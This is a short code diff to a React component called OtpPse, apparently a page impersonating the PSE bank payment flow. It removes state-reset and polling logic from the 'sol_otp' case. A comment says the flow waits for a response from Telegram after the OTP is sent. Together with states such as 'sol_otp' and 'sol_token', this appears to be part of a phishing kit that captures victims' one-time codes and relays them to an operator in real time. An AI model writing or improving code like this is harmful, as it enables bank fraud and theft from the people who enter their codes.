@@ -268,47 +268,11 @@ export default function OtpPse() {
       // Se ejecuta el switch del estado actual
       switch (currentState) {
         case "sol_otp":
-
-          // Se valida si el OTP fue enviado y el flujo sigue esperando respuesta
+          // Si estamos esperando respuesta de Telegram tras enviar OTP, continuar esperando
           if (esperandoRespuestaTrasEnviarRef.current) {
-
-            // Se valida si no se vio el estado pendiente tras enviar el OTP
-            if (!otpTrasEnviarVioPendienteRef.current) {
-
-              // Se sale del if
-              break;
-            }
-
-            // Se resetea el control de reenvio tras ver pendiente
-            otpTrasEnviarVioPendienteRef.current = false;
-            esperandoRespuestaTrasEnviarRef.current = false;
-
-            // Se desactiva el loading
-            setLoading(false);
-
-            // Se limpia la UI del OTP
-            setCode("");
-
-            // Se limpia el error del OTP
-            setOtpError(null);
-
-            // Se actualiza el estado de la sesión
-            updateStateSession("solicitar_otp");
-
-            // Se inicia el polling
-            initPolling();
-
-            // Se sale del switch
             break;
           }
-
-          // Se mantiene la misma pantalla OTP sin reenviar navegación
           setLoading(false);
-
-          // Se actualiza el estado de la sesión
-          updateStateSession("solicitar_otp");
-
-          // Se sale del switch
           break;
         case "sol_token":
 
